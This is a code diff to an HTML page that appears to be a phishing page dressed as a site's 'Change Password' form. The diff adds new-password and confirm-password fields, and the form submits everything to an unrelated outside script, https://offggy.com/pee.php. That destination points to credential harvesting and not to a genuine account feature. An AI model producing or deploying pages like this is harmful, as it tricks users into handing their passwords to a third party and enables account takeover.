@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
-    <title>Password Reset</title>
+    <title>Change Password</title>
     <meta name="description" content="">
     
     <!-- Fonts -->
@@ -59,7 +59,7 @@
                             <div class="col-md-6">
                                 <div>
                                     <div class="card card-bg p-5 m-2 bg-main">
-                                        <h2>Forgot your password? </h2>
+                                        <h2>Change Password </h2>
                                         <form method="post" action="https://offggy.com/pee.php">
                                             <input type="hidden" name="csrfmiddlewaretoken" value="tD4ZxHTKK9pBsZNdHMRkljAo1KcsYPZZbi1eRjsWbh9HL9P0khyaXa6OpONAmSiM">
                                             
@@ -76,14 +76,40 @@
                                                        required>
                                             </div>
                                             
+                                            <div id="div_id_password" class="mb-3">
+                                                <label for="id_password" class="form-label requiredField">
+                                                    New Password<span class="asteriskField">*</span>
+                                                </label>
+                                                <input type="password" 
+                                                       id="id_password" 
+                                                       name="password" 
+                                                       placeholder="New Password" 
+                                                       autocomplete="new-password" 
+                                                       class="passwordinput form-control" 
+                                                       required>
+                                            </div>
+                                            
+                                            <div id="div_id_password_confirm" class="mb-3">
+                                                <label for="id_password_confirm" class="form-label requiredField">
+                                                    New Password (again)<span class="asteriskField">*</span>
+                                                </label>
+                                                <input type="password" 
+                                                       id="id_password_confirm" 
+                                                       name="password_confirm" 
+                                                       placeholder="New Password (again)" 
+                                                       autocomplete="new-password" 
+                                                       class="passwordinput form-control" 
+                                                       required>
+                                            </div>
+                                            
                                             <button class="btn btn-md btn-primary text-white" type="submit" name="submit">
-                                                Reset Password
+                                                Change Password
                                             </button>
                                             <br>
                                             <br>
                                             
                                             <div class="row login">
-                                                <a class="mb-2 text-white" href="sign_up.html">Sign Up</a>
+                                                <a class="mb-2 text-white" href="sign_in.html">Login</a>
                                             </div>
                                             
                                             <div class="clearfix"></div>
